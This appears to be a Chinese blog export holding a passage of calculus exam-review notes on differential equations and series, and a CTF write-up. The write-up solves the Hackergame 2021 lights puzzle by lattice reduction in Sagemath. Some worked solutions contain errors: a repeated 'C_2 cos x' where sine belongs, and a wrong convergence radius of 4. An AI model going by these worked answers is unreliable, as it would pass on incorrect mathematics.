，再次分离分量，有<br>$$<br>\\frac{\\mathrm{d}y}{\\tan(y+C_1)}=\\mathrm{d}x \\\\<br>\\ln\\sin(y+C_1)=x+C_2<br>$$<br>最终得出 $y=\\arcsin e^{x+C_2}-C_1$</p>\n<h4 id=\"3-微分方程解的存在唯一性定理\"><a href=\"#3-微分方程解的存在唯一性定理\" class=\"headerlink\" title=\"3. 微分方程解的存在唯一性定理\"></a>3. 微分方程解的存在唯一性定理</h4><h4 id=\"4-高阶线性微分方程\"><a href=\"#4-高阶线性微分方程\" class=\"headerlink\" title=\"4. 高阶线性微分方程\"></a>4. 高阶线性微分方程</h4><h4 id=\"5-二阶线性常系数微分方程\"><a href=\"#5-二阶线性常系数微分方程\" class=\"headerlink\" title=\"5. 二阶线性常系数微分方程\"></a>5. 二阶线性常系数微分方程</h4><table>\n<thead>\n<tr>\n<th>特征根</th>\n<th>通解形式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>两相异实根 $\\lambda_1,\\lambda_2$</td>\n<td>$C_1e^{\\lambda_1x}+C_2e^{\\lambda_2x}$</td>\n</tr>\n<tr>\n<td>二重根 $\\lambda_1$</td>\n<td>$(C_1+C_2x)e^{\\lambda_1x}$</td>\n</tr>\n<tr>\n<td>共轭复根 $\\lambda_{1,2}=\\alpha\\pm\\mathrm{i}\\beta$</td>\n<td>$e^{\\alpha x}(C_1\\cos\\beta x+C_2\\sin\\beta x)$</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>$f(x)$ 的形式</th>\n<th>条件</th>\n<th>特解的形式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$P_n(x)$</td>\n<td>“0”不是/是单/是重特征根</td>\n<td>$Q_n(x)/xQ_n(x)/x^2Q_n(x)$</td>\n</tr>\n<tr>\n<td>$ae^{\\alpha x}$</td>\n<td>$\\alpha$ 不是/是单/是重特征根</td>\n<td>$Ae^{\\alpha x}/Axe^{\\alpha x}/Ax^2e^{\\alpha x}$</td>\n</tr>\n<tr>\n<td>$a\\cos\\beta x+b\\sin\\beta x$</td>\n<td>$\\pm\\mathrm{i}\\beta$ 不是/是特征根</td>\n<td>$A\\cos\\beta x+B\\sin\\beta x/x(A\\cos\\beta x+B\\sin\\beta x)$</td>\n</tr>\n<tr>\n<td>$P_n(x)e^{\\alpha x}$</td>\n<td>$\\alpha$ 不是/是单/是重特征根</td>\n<td>$Q_n(x)e^{\\alpha x}/xQ_n(x)e^{\\alpha x}/x^2Q_n(x)e^{\\alpha x}$</td>\n</tr>\n<tr>\n<td>$P_n(x)e^{\\alpha x}(a\\cos\\beta x+b\\sin\\beta x)$</td>\n<td>$\\alpha\\pm\\mathrm{i}\\beta$ 不是/是特征根</td>\n<td>$e^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]/xe^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]$</td>\n</tr>\n</tbody></table>\n<p>咋一看很多，其实挺有规律，比如多一个根就多乘一个 $x$ ，原来的系数变成待定的。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，6）求微分方程 $y’’+y=e^{3x}(x+2)$ 的通解。<br><strong>解</strong> 先求对应齐次微分方程 $y’’+y=0$ 的通解，特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故通解形式为<br>$$<br>y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x<br>$$<br>其中 $C_1,C_2$ 为任意常数<br>再用待定系数法求特解，“3“不是特征根，故设方程有特解 $y=(Ax+B)e^{3x}$ ，则<br>$$<br>\\begin{aligned}<br>y’&amp;=Ae^{3x}+3(Ax+B)e^{3x} \\\\<br>y’’&amp;=3Ae^{3x}+3Ae^{3x}+9(Ax+B)e^{3x}=(9Ax+6A+9B)e^{3x} \\\\<br>\\end{aligned}<br>$$<br>回代得<br>$$<br>y’’+y=(10Ax+6A+10B)e^{3x}=e^{3x}(x+2)<br>$$<br>解得 $A=\\frac{1}{10},\\ B=\\frac{7}{50}$ ，故特解为 $y=(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$ ，与齐次方程通解相加，得出所求非齐次方程通解为<br>$$<br>y(x)=C_1\\cos x+C_2\\cos x+(\\frac{1}{10}x+\\frac{7}{50})e^{3x}<br>$$<br>其中 $C_1,C_2$ 为任意常数。</p>\n<p><strong>例</strong>（2020-2021第二学期期末，6）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}+y=e^x+\\cos x$ 的通解。<br><strong>解</strong> 特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故齐次方程通解形式为<br>$$<br>y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x<br>$$<br>这个方程的非齐次项由两项组成，就先分别求两项的特解，再相加，就是原方程的特解。<br>对方程 $y’’+y=e^x$ 不难求得特解 $y=\\frac{1}{2}e^x$ ，方程 $y’’+y=\\cos x$ 的特解 $y=\\frac{1}{2}x\\cos x$ ，故原方程的特解为<br>$$<br>y=\\frac{1}{2}(e^x+x\\cos x)<br>$$<br>与齐次方程通解相加，得出所求非齐次方程通解为<br>$$<br>y(x)=C_1\\cos x+C_2\\cos x+\\frac{1}{2}(e^x+x\\cos x)<br>$$</p>\n<h4 id=\"6-用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\"><a href=\"#6-用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\" class=\"headerlink\" title=\"6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\"></a>6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法</h4><h4 id=\"7-常系数线性微分方程组\"><a href=\"#7-常系数线性微分方程组\" class=\"headerlink\" title=\"7. 常系数线性微分方程组\"></a>7. 常系数线性微分方程组</h4><h3 id=\"第十章-无穷级数\"><a href=\"#第十章-无穷级数\" class=\"headerlink\" title=\"第十章 无穷级数\"></a>第十章 无穷级数</h3><h4 id=\"1-柯西收敛原理与数项级数的概念\"><a href=\"#1-柯西收敛原理与数项级数的概念\" class=\"headerlink\" title=\"1. 柯西收敛原理与数项级数的概念\"></a>1. 柯西收敛原理与数项级数的概念</h4><h4 id=\"2-正项级数的收敛判别法\"><a href=\"#2-正项级数的收敛判别法\" class=\"headerlink\" title=\"2. 正项级数的收敛判别法\"></a>2. 正项级数的收敛判别法</h4><ol>\n<li>比较审敛法<br>比收敛小的就收敛，比发散大的就发散</li>\n<li>比值审敛法<br>$\\lim\\limits_{n\\to\\infty}\\frac{u_{n+1}}{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定</li>\n<li>根值审敛法<br>与上面类似，$\\lim\\limits_{n\\to\\infty}\\sqrt[n]{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定</li>\n<li>对数审敛法</li>\n</ol>\n<p><strong>例</strong>（2021-2022第二学期期末，10-1）判断数项级数 $\\sum\\limits_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})$ 的敛散性。<br><strong>解</strong> 放缩一下再比较判别法<br>$$<br>\\sum_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})&lt;\\sum_{n=1}^{\\infty}3^n(\\frac{\\pi}{4^n})=\\pi\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n<br>$$<br>由于 $\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$ 收敛，故原级数收敛。</p>\n<h4 id=\"3-任意项级数\"><a href=\"#3-任意项级数\" class=\"headerlink\" title=\"3. 任意项级数\"></a>3. 任意项级数</h4><p><strong>莱布尼茨判别法</strong> 若交错级数满足下列条件：<br>$$<br>(1)u_n\\geqslant u_{n+1}; \\\\<br>(2)\\lim_{n\\rightarrow\\infty}=0,<br>$$<br>则级数收敛。<br><strong>狄利克雷判别法</strong> 考虑级数<br>$$<br>\\sum_{k=1}^{\\infty}a_kb_k<br>$$<br>若序列 ${a_k}$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，又级数 $\\sum\\limits_{n=1}^{\\infty}b_k$ 的部分和序列有界，则级数 $\\sum\\limits_{k=1}^{\\infty}a_kb_k$ 收敛。<br><strong>例</strong>（2021-2022第二学期期末，10-2）判断数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 的敛散性。<br><strong>解</strong> 取 $a_k=\\frac{1}{\\ln n}$ ，易证得 $a_k$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，下证级数 $\\sum\\limits_{n=2}^{\\infty}\\cos(2n)$ 的部分和序列有界：<br>$$<br>\\begin{aligned}<br>\\left|\\sum_{k=2}^{n}\\cos(2k)\\right|&amp;=\\left|\\cos4+\\cos6+\\cdots+\\cos2n\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\cos4\\sin1+\\cos6\\sin1+\\cdots+\\cos2n\\sin1\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin5-\\sin3}{2}+\\frac{\\sin7-\\sin5}{2}+\\cdots+\\frac{\\sin(2n+1)-\\sin(2n-1)}{2}\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin(2n+1)-\\sin3}{2}\\right| \\\\<br>&amp;\\leqslant\\frac{1}{\\sin1}<br>\\end{aligned}<br>$$<br>故级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 收敛。</p>\n<blockquote>\n<p><strong>积化和差公式</strong><br>$$<br>{\\displaystyle \\sin \\alpha \\cos \\beta ={\\sin(\\alpha +\\beta )+\\sin(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\cos \\alpha \\sin \\beta ={\\sin(\\alpha +\\beta )-\\sin(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\cos \\alpha \\cos \\beta ={\\cos(\\alpha +\\beta )+\\cos(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\sin \\alpha \\sin \\beta ={\\cos(\\alpha +\\beta )-\\cos(\\alpha -\\beta ) \\over -2}}<br>$$</p>\n</blockquote>\n<p><strong>阿贝尔判别法</strong><br>（1）无穷数列 ${a_k}$ 单调有界<br>（2）级数 $\\sum\\limits_{k=1}^\\infty b_k$ 收敛<br>则级数 $\\sum\\limits_{k=1}^\\infty a_kb_k$ 收敛。</p>\n<h4 id=\"4-函数项级数\"><a href=\"#4-函数项级数\" class=\"headerlink\" title=\"4. 函数项级数\"></a>4. 函数项级数</h4><h5 id=\"4-1-函数序列及函数项级数的一致收敛性\"><a href=\"#4-1-函数序列及函数项级数的一致收敛性\" class=\"headerlink\" title=\"4.1 函数序列及函数项级数的一致收敛性\"></a>4.1 函数序列及函数项级数的一致收敛性</h5><h5 id=\"4-2-函数项级数一致收敛的必要条件与判别法\"><a href=\"#4-2-函数项级数一致收敛的必要条件与判别法\" class=\"headerlink\" title=\"4.2 函数项级数一致收敛的必要条件与判别法\"></a>4.2 函数项级数一致收敛的必要条件与判别法</h5><p><strong>强级数判别法</strong> 若函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 的一般项满足：<br>$$<br>|u_n(x)|\\leqslant a_n,\\quad \\forall x\\in X,n=1,2,\\cdots,<br>$$<br>且正项级数 $\\sum\\limits_{n=1}^\\infty a_n$ 收敛，则该函数项级数在 $X$ 上一致收敛。</p>\n<p><strong>狄利克雷判别法</strong> 与数项级数的狄利克雷判别法类似。<br>（1）在 $X$ 中任意取定一个 $x$ ，数列 ${a_n(x)}$ 对 $n$ 单调，且函数序列 ${a_n(x)}$ 在 $X$ 上一致收敛于 $0$<br>（2）函数项级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 的部分和序列 ${B_n(x)}$ 在 $X$ 上一致有界<br>则 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。</p>\n<p><strong>阿贝尔判别法</strong> 与数项级数的阿贝尔判别法类似。<br>（1）在 $X$ 中任意取定一个 $x$ ，数列 ${a_n(x)}$ 单调，又函数序列 ${a_n(x)}$ 在 $X$ 上一致有界<br>（2）级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 在 $X$ 上一致收敛<br>则级数 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。</p>\n<h5 id=\"4-3-一致收敛级数的性质\"><a href=\"#4-3-一致收敛级数的性质\" class=\"headerlink\" title=\"4.3 一致收敛级数的性质\"></a>4.3 一致收敛级数的性质</h5><p><strong>和函数的连续性</strong> 设函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上一致收敛，且其每一项 $u_n(x)$ 在 $[a,b]$ 上都连续，则其和函数 $S(x)=\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上也连续。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，11）考虑函数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{1}{n^2\\sqrt x}$ ，证明：<br>（1）级数在 $(0,1)$ 上收敛<br>（2）级数在 $(0,1)$ 上不一致收敛<br>（3）级数的和函数 $S(x)$ 在 $(0,1)$ 上连续<br><strong>解</strong> （1）就是数项级数，随便证。<br>（2）存在点列 $x_n=\\frac{1}{n^4}\\in(0,1)(n=1,2,\\cdots)$ 使 $u_n(x_n)=1$</p>\n<h4 id=\"5-幂级数\"><a href=\"#5-幂级数\" class=\"headerlink\" title=\"5. 幂级数\"></a>5. 幂级数</h4><p>幂级数是<strong>函数项级数的一种</strong>，长这样：<br>$$<br>a_0+a_1(x-x_0)+a_2(x-x_0)^2+\\cdots+a_n(x-x_0)^n+\\cdots<br>$$</p>\n<h5 id=\"5-1-幂级数的收敛半径\"><a href=\"#5-1-幂级数的收敛半径\" class=\"headerlink\" title=\"5.1 幂级数的收敛半径\"></a>5.1 幂级数的收敛半径</h5><p>$$<br>\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_{n+1}}{a_{n}}\\right|=l<br>$$<br>那么级数 $\\sum\\limits^n_{n=0}a_nx^n$ 的<strong>收敛半径</strong> $R=1/l$ ，当然直接反着除直接出也行。<br><strong>收敛区间</strong>就是 $(-R,R)$ ，<strong>收敛域</strong>就根据端点的收敛情况再修正下区间闭不闭合。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，8）求幂级数 $\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ 的收敛半径与和函数。<br><strong>解</strong><br>$$<br>\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_n}{a_{n+1}}\\right|=\\lim_{n\\rightarrow\\infty}\\left|\\frac{n}{n+1}\\right|=1<br>$$<br>故收敛半径 $R=1$ ，收敛区间 $(-1,1)$ 。<br>然后讨论两个端点，当 $x=1$ 时，原级数发散；当 $x=-1$ 时，原级数收敛，故收敛域为 $[-1,1)$<br>设和函数 $S(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ ，则两边乘 $x$ 有 $xS(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^{n+1}$ ，两边求导有<br>$$<br>\\left[xS(x)\\right]’=\\sum\\limits^\\infty_{n=0}x^n=\\frac{1}{1-x}<br>$$<br>再两边求积，有<br>$$<br>xS(x)=\\int^x_0\\frac{1}{1-x}\\mathrm{d}x=-\\ln(1-x),\\ x\\in[-1,1)<br>$$<br>故当 $x\\ne0$ 时，$S(x)=-\\frac{1}{x}\\ln(1-x)$ ；当 $x=0$ 时，肉眼可见 $S(x)=1$ 。</p>\n<blockquote>\n<p>这里有个小 trick ，就是<strong>幂级数里认定 $0^0=1$</strong> ，至于为什么是这样，网上众说纷纭，读者可自行查阅。</p>\n</blockquote>\n<h5 id=\"5-2-幂级数的性质\"><a href=\"#5-2-幂级数的性质\" class=\"headerlink\" title=\"5.2 幂级数的性质\"></a>5.2 幂级数的性质</h5><p>和函数项级数一样，可以逐项求积，也可以逐项求导。</p>\n<h4 id=\"6-泰勒级数\"><a href=\"#6-泰勒级数\" class=\"headerlink\" title=\"6. 泰勒级数\"></a>6. 泰勒级数</h4><p>求函数在 $x=k$ 处的泰勒展开式就作 $t=x-k$ 变换，然后求出来的式子再代回去就行了。</p>\n<p>记一下常用的几条泰勒展开式：<br>$$<br>\\frac{1}{1-x}=1+x+x^2+x^3+\\cdots+x^n+\\cdots,\\ x\\in(-1,1)\\\\<br>e^x=1+x+\\frac{x^2}{2!}+\\frac{x^3}{3!}+\\cdots+\\frac{x^n}{n!}+\\cdots\\\\<br>\\sin x=x-\\frac{x^3}{3!}+\\frac{x^5}{5!}-\\frac{x^7}{7!}+\\cdots+(-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!}+\\cdots\\\\<br>\\cos x=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}-\\frac{x^6}{6!}+\\cdots+(-1)^{n}\\frac{x^{2n}}{(2n)!}+\\cdots\\\\<br>\\arctan x=x-\\frac{x^3}{3}+\\frac{x^5}{5}-\\frac{x^7}{7}+\\cdots+(-1)^{n}\\frac{x^{2n+1}}{(2n+1)}+\\cdots\\\\<br>\\ln(1+x)=x-\\frac{x^2}{2}+\\frac{x^3}{3}-\\frac{x^4}{4}+\\cdots+(-1)^{n-1}\\frac{x^n}{n}+\\cdots\\\\<br>(1+x)^\\alpha=1+\\alpha x+\\frac{\\alpha(\\alpha-1)}{2!}x^2+\\frac{\\alpha(\\alpha-1)(\\alpha-2)}{3!}x^3+\\cdots+\\frac{\\alpha(\\alpha-1)(\\alpha-2)\\cdots(\\alpha-n+1)}{n!}x^n+R_n(x)<br>$$<br>关于最后这个 $R_n(x)$ ，一堆证明后得出，当 $x\\in (-1,1)$ 时有 $\\lim\\limits_{n\\rightarrow \\infty}=0$</p>\n<p><strong>例</strong>（2021-2022第二学期期末，10）求函数 $y=\\frac{x}{4+x^2}$ 在 $x=0$ 处的泰勒级数，并指出其收敛域。<br><strong>解</strong> $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，右边显然就是 $\\arctan x$ 导数的形式了，故我们由 $\\arctan x$ 的泰勒展开式逐项求导有<br>$$<br>\\frac{1}{1+x^2}=(\\arctan x)’=1-x^2+x^4-x^6+\\cdots+(-1)^{n}x^{2n}+\\cdots<br>$$<br>变形得<br>$$<br>\\frac{1}{1+(\\frac{x}{2})^2}=1-\\frac{x^2}{4}+\\frac{x^4}{16}-\\frac{x^6}{64}+\\cdots+(-1)^{n}\\frac{x^{2n}}{2^{2n}}+\\cdots<br>$$<br>最后代入 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，有<br>$$<br>y=\\frac{x}{4}-\\frac{x^3}{16}+\\frac{x^5}{64}-\\frac{x^7}{256}+\\cdots+(-1)^n\\frac{x^{2n+1}}{2^{2n+2}}+\\cdots<br>$$<br>那么级数形式为<br>$$<br>y=\\sum\\limits^\\infty_{n=0}\\frac{(-1)^n}{4^{n+1}}x^{2n+1}<br>$$<br>收敛半径 $R=\\lim\\limits_{n\\rightarrow\\infty}\\left|\\frac{(-1)^{n}}{4^{n+1}}\\cdot\\frac{4^{n+2}}{(-1)^{n+1}}\\right|=4$<br>故收敛区间为 $(-4,4)$ ，当 $x=-4$ 时，</p>"},{"title":"灯，等灯等灯","date":"2022-03-31T02:18:00.000Z","_content":"\n线性同余方程组与格基约化问题\n<!--more-->\n\n## 前言\n\n> 没有听到吗？在耳边回荡着的钟声。\n>\n> 传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。\n>\n> 而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。\n>\n> 只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。\n>\n> 此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。\n>\n> 还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声——\n>\n> 灯，等灯等灯\n\n以上是 Hackergame 2021 的一道点灯题的题文。\n\n解这题的时候连线代都不会，拿到神的题解也跑不起来，后来才知道 Sagemath 要另行安装， `pip install sage` 是无用的。\n前些天在单人豪华房里坐了几天牢，趁机也入门了一下格密码，隐约联想到这道题有点类似 CVP 的感觉，而再回头看神的题解果真也是这个思路，如今便借着学习一下 Python 和格。\n考虑到读者水平可能与我相近，故以下的分析我尽可能做到详细，几乎每一步都有分析，相应的，文章篇幅也会比较长。如果能认真读完并理解，相信会有不小的收获。\n\n## 题目链接\n\n<http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==>\n如果还没关的话应该能打开（）\n> 好吧已经 Hackergame 2022 了，关了。\n\n## 灯 by mcfx详解\n\n注：此题共 3 关，为 Level0 、 Level1 及 Level2 ，由于 Level1 综合了三关的解法，故以下均以 Level1 为例。\n\n1. **准备数据及函数**\n\n    ```Python\n    from sage.all import *\n    import sys, requests\n\n    target = [\n        [189, 189, 189, 189, 189, 33, 33, 33, 189, 189, 189, 189],\n        [189, 189, 189, 33, 33, 33, 189, 33, 44, 189, 189, 189],\n        [189, 189, 189, 189, 189, 33, 33, 33, 33, 189, 189, 189],\n        [189, 189, 189, 189, 189, 33, 189, 33, 33, 189, 189, 189],\n        [189, 189, 189, 33, 33, 189, 189, 33, 33, 33, 189, 189],\n        [189, 134, 33, 33, 189, 189, 189, 189, 33, 33, 189, 189],\n        [189, 144, 33, 33, 189, 189, 189, 189, 33, 189, 189, 189],\n        [189, 142, 33, 33, 189, 189, 189, 189, 33, 33, 33, 189],\n        [189, 100, 142, 33, 189, 189, 189, 189, 33, 33, 33, 189],\n        [189, 142, 142, 189, 189, 189, 189, 189, 189, 33, 189, 189],\n        [189, 59, 142, 33, 189, 189, 189, 189, 33, 189, 189, 189],\n        [189, 189, 33, 33, 189, 189, 189, 189, 189, 189, 189, 189],\n    ]\n\n    def level01_val(i, j, x, y):\n        if (x == i or y == j):\n            return 3 - (abs(x - i) + abs(y - j))\n        return 0\n\n    def level2_val(i, j, x, y):\n        return [31, 63, 127][max(abs(x - i), abs(y - j))]\n\n    levels = [\n        (level01_val, '''\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    ............\n    '''),\n        (level01_val, '''\n    ............\n    ............\n    ..X.X.......\n    ..XXX.......\n    ..X.X.......\n    ............\n    .......XXX..\n    .......X....\n    .......X.X..\n    .......XXX..\n    ............\n    ............\n    '''),\n        (level2_val, '''\n    ............\n    ............\n    ..X.X...XX..\n    ..X.X...X...\n    ..XXX..XX...\n    ............\n    ............\n    ..XXX..XXX..\n    ...X...X....\n    ...X...XXX..\n    ............\n    ............\n    ''')\n    ]\n\n    def id(x, y): return x * 12 + y\n\n    level_id = int(sys.argv[1])\n    ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()))\n    ```\n\n    * `from sage.all import *`\n首先要**安装 Sagemath**，因为 Sagemath 在 Windows 下运行也是要虚拟出一个 Unix 环境，故建议在 WSL 里 `sudo apt install sagemath` ，可能中途要 `apt-get upgrade` 。\n    * `sys.argv[1]`\n`argv[0]` 是脚本名称（它是否为完整路径名取决于操作系统）。则 `argv[1]` 为省去后缀名的文件名，如 Level0 时为脚本名为 `0.py` ， `argv[1]` 为 0 。\n    * `ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()))`\n    `lambda` 是 Python 的一个关键字，可以用来定义**匿名函数**。\n所谓匿名函数，就是没有名字的函数，与命名函数类似，都有参数和返回值，只是没有名字。\n如 `add=lambda x, y: x+y` 这个函数就将传入的两个参数相加，返回结果，即 `add(1, 2)` 等于 `1+2` ； `map(lambda x: x+1, [1, 2, 3])` 将列表 [1, 2, 3] 中的元素分别加 1 ，其结果 [2, 3, 4] 。\n这里 `map(lambda x: [y == 'X'for y in x], levels[level_id][1].split())` 一句是将上面定义的 12 阶方阵中 `X` 转为 `True` ， `.` 转为 `False` ，然后放入一个列表 `ban` 中，此时 `ban` 为两级列表。\n2. **准备矩阵系数**\n\n    ```Python\n    m = []\n    free = []\n    for i in range(12):\n        for j in range(12):\n            if ban[i][j]:\n                continue\n            free.append((i, j))\n            t = [0] * 144\n            for x in range(i - 2, i + 3):\n                for y in range(j - 2, j + 3):\n                    if (0 <= x < 12) and (0 <= y < 12):\n                        t[id(x, y)] = levels[level_id][0](i, j, x, y)\n            m.append(t + [0])\n    ```\n\n    * `levels[level_id][0](i, j, x, y)`\n    这里是在元组里放函数，注意到上面的 `Levels=[(levev01_val, '''...'''),(...),(...)]` ，所以 `levels[level_id][0]` 是 `levev01_val` 函数。这样的用法如：\n\n        ```Python\n        def add(x,y):return x+y\n        tup=(add,1,2)\n        print(tup[0](tup[1],tup[2]))\n        # 3\n        ```\n\n        list也可以实现类似操作，Python确实花.jpg。\n\n    不难发现， free[] 里放的是可以点的坐标，如 $(0,0),(0,1)...$\n    注意到， `level01_val` 函数在上面已经定义：\n\n    ```Python\n    def level01_val(i, j, x, y):\n    if (x == i or y == j):\n        return 3 - (abs(x - i) + abs(y - j))\n    return 0\n    ```\n\n    这个函数的参数中 `i,j` 为操作的点(即按下的点)坐标， `x,y` 为受影响的点坐标，**返回值为受影响坐标的增量**。\n    如 `(i,j)` 为 $(2,3)$ 时，若 `x,y` 为 $(2,3)$ ，则根据规则，返回值为 3 ，若 `x,y` 为 $(2,4)$ ，则返回值为 2 ，若 `x,y` 为 $(3,3)$ ，则返回值为 2 ，若 `x,y` 为 $(3,4)$ ，则返回值为 0 。如下表：\n    | x\\y\\返回值 | 2 | 3 | 4 |\n    | :----: | :----: | :----: | :----: |\n    | 1 | 0 | 2 | 0 |\n    | 2 | 2 | 3 | 2 |\n    | 3 | 0 | 2 | 0 |\n\n    ```Python\n    for x in range(i - 2, i + 3):\n        for y in range(j - 2, j + 3):\n            if (0 <= x < 12) and (0 <= y < 12):\n                t[id(x, y)] = levels[level_id][0](i, j, x, y)\n    m.append(t + [0])\n    ```\n\n    上面已经定义函数 `def id(x, y): return x * 12 + y` ，即 `id` 函数把给定的**坐标**转为方阵**一维展开后的位置**，则此处把每个操作点对整个方阵 144 个位置影响(增量)后面补一个 0 （下面会解释为什么加一个 0 ）放入 `t[]` 中，此时t可以看作一个**向量**。\n    每个 `t[]` 补入 `m[]` 后，此时 $m$ 是一个 (144-16)x(144+1) 即 **128x145** 的矩阵，且第 145 列全为 0 ( 16 为 X 即**不可操作点的数量**)，如下：\n    $$\n    m=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 \\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 \\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 \\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0\n    \\end{pmatrix}\n    $$\n\n    **注意：上面打省略号的地方不全为0！**\n    比如第一行是由如下一个 12x12 的矩阵展开为一维形式：\n    $$\n    \\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    2 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    1 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0 \\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 0\n    \\end{pmatrix}\n    $$\n\n    ```Python\n    for i in range(144):\n        m.append([(i == j) * 256 for j in range(144)] + [0])\n\n    t = []\n    for i in range(12):\n        for j in range(12):\n            t.append(target[i][j])\n    C = 256\n    m.append([-x for x in t] + [C])\n    ```\n\n    不难看出，此时的 $m$ 为如下形式：\n    $$\n    m=\\begin{pmatrix}\n    3 & 2 & 1 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    2 & 3 & 2 & 1 & 0 & \\cdots & 0 & 0\\\\\\\\\n    1 & 2 & 3 & 2 & 1 & \\cdots & 0 & 0\\\\\\\\\n    0 & 1 & 2 & 3 & 2 & \\cdots & 0 & 0\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 & 0 & \\cdots & 3 & 0\\\\\\\\\n    256 & 0 & 0 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 256 & 0 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 256 & 0 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 0 & 256 & 0 & \\cdots & 0 & 0\\\\\\\\\n    0 & 0 & 0 & 0 & 256 & \\cdots & 0 & 0\\\\\\\\\n    \\vdots & \\vdots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots & \\vdots \\\\\\\\\n    0 & 0 & 0 & 0 